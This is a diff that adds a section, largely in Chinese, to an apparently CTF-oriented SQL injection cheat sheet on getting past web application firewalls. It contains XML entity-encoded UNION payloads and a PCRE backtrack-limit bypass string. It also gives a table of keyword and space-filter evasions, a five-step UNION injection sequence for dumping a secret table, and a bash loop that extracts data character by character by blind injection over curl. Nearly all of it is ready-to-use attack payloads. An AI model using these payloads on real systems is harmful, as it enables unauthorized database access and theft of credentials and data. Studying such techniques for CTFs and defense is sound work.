@@ -70,3 +70,61 @@ keywords → SeLeCt (case), /*!union*/ (MySQL inline comment)
 - **The goal is extraction, not bypass** — after login bypass, go enumerate and dump the flag column.
 - **Blind = slow but always works** — substring + ascii + time is the universal fallback when union/error are blocked.
 - Self-verify: the extracted value should be self-consistent (read the same column twice) before trusting it.
+
+## WAF 绕过 SQLi 组合技巧
+
+### XML Entity Encoding(绕过关键字过滤）
+```xml
+<!-- WAF 过滤 UNION/SELECT 关键字时,用 XML hex entity -->
+<input>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; password &#x46;&#x52;&#x4f;&#x4d; users</input>
+```
+WAF 看原始 XML 不认识关键字,但 XML parser 解码后传给 SQL 层。
+
+### PHP PCRE Backtrack Limit Bypass
+```
+# 如果 WAF 用 PHP 正则检测 payload,发送 >1000000 字符的输入
+# preg_match 超过 pcre.backtrack_limit 返回 false,绕过检查
+payload = "1/*" + "a"*1000000 + "*/UNION SELECT password FROM users--"
+```
+
+### 常用 WAF 绕过变体表
+
+| 被过滤 | 绕过 |
+|---|---|
+| `UNION SELECT` | `UNiON SeLeCT` / `UN/**/ION SEL/**/ECT` / `UNION ALL SELECT` |
+| 空格 | `/**/` / `%09` / `%0a` / `+` / 括号:`UNION(SELECT(1))` |
+| `information_schema` | `infOrMation_schema` / 反引号 / `SCHEMA()` |
+| `=` | `LIKE` / `REGEXP` / `BETWEEN` / `IN()` |
+| 引号 | `0x616263`(hex) / `CHAR(97,98,99)` |
+| `OR`/`AND` | `||` / `&&` / `^` |
+
+### 读管理员秘密表的标准流程
+
+```sql
+-- 1. 确认注入(报错/布尔/时间)
+' AND 1=1-- 
+' AND 1=2--
+
+-- 2. 确定列数
+' ORDER BY 1--  (递增直到报错)
+
+-- 3. UNION 读 information_schema
+' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
+
+-- 4. 找目标表(admin/secret/flag/user)
+' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='admin_secret'--
+
+-- 5. 读数据
+' UNION SELECT flag,2,3 FROM admin_secret--
+```
+
+### 布尔盲注一行脚本
+```bash
+# 逐字符提取(当无回显时)
+for i in $(seq 1 50); do
+  for c in $(seq 32 126); do
+    r=$(curl -s "http://target/like?id=1' AND ASCII(SUBSTR((SELECT flag FROM secret),${i},1))=${c}--" | grep -c "success")
+    [ "$r" != "0" ] && printf "\\$(printf '%03o' $c)" && break
+  done
+done
+```
